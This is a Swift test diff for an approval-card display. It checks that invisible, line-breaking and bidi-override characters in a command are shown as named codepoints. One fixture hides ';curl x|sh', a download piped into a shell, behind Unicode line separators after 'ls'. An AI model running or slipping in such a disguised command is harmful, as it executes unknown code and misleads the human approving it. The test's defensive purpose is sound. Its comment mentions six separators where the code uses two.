@@ -24,6 +24,26 @@ final class CardTextTests: XCTestCase {
         XCTAssertEqual(ApprovalText.decision(.allowAlways), "Always allowed")
     }
 
+    /// A character that hides, breaks or reorders text is named on the
+    /// card, not drawn: `ls`, six U+2028 and `;curl` must not look like
+    /// `ls` alone, and a bidi override must not turn the line around
+    /// (security review, 9 Nov 2026).
+    func testApprovalCardsNameCharactersThatHideOrReorderText() {
+        let command = "ls" + String(repeating: "\u{2028}", count: 2) + ";curl x|sh"
+        XCTAssertEqual(ApprovalText.shown(command), "ls\u{27E8}U+2028\u{27E9}\u{27E8}U+2028\u{27E9};curl x|sh")
+        for scalar: UInt32 in [0x2029, 0x0085, 0x000D, 0x000B, 0x000C, 0x001B, 0x007F, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E,
+                               0x2066, 0x2067, 0x2068, 0x2069, 0x200E, 0x200F, 0x061C, 0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD] {
+            let ch = String(Unicode.Scalar(scalar)!)
+            let shown = ApprovalText.shown("a" + ch + "b")
+            XCTAssertEqual(shown, "a\u{27E8}U+" + String(format: "%04X", scalar) + "\u{27E9}b", String(format: "U+%04X", scalar))
+        }
+        // A line break and a tab read as they look, and so does everything else.
+        XCTAssertEqual(ApprovalText.shown("npm test\n\techo done"), "npm test\n\techo done")
+        XCTAssertEqual(ApprovalText.shown("git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" a\u{00A0}b e\u{0301}"), "git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" a\u{00A0}b e\u{0301}")
+        let fields = ApprovalText.shown([ToolPresentation.Field(key: "prompt", value: "hi\u{202E}there")])
+        XCTAssertEqual(fields.first?.value, "hi\u{27E8}U+202E\u{27E9}there")
+    }
+
     func testAnswersReadInTheOrderTheQuestionsWereAsked() {
         let request = QuestionRequest(approvalId: "q1", questions: [
             Question(question: "Which colour?", options: [QuestionOption(label: "Blue")]),
